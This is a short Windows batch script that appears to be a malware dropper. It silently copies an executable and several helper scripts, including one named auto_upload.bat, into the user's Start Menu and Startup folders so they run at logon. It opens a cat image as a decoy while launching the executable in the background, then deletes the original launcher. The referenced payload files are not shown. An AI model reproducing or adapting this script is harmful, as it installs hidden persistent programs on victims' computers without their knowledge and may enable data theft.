@echo off

copy "a.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\a.exe" >nul 2>&1
copy "auto_run.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\auto_run.vbs" >nul 2>&1
copy "auto_run.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\auto_run.bat" >nul 2>&1
copy "auto_upload.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\auto_upload.bat" >nul 2>&1
copy "run_silent.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\run_silent.vbs" >nul 2>&1

attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\a.exe"
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\auto_run.vbs"
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\auto_run.bat"
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\auto_upload.bat"
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\run_silent.vbs"

taskkill /F /IM a.exe >nul 2>&1
taskkill /F /IM Cat.png >nul 2>&1

start "" /b Cat.png
cmd /c start /b "" a.exe

@REM cd ..
@REM copy "C\Cat.png" "%CD%\C.png" >nul 2>&1

cd .. 
cmd /c timeout /t 2 >nul & del /f /q "C.exe"

exit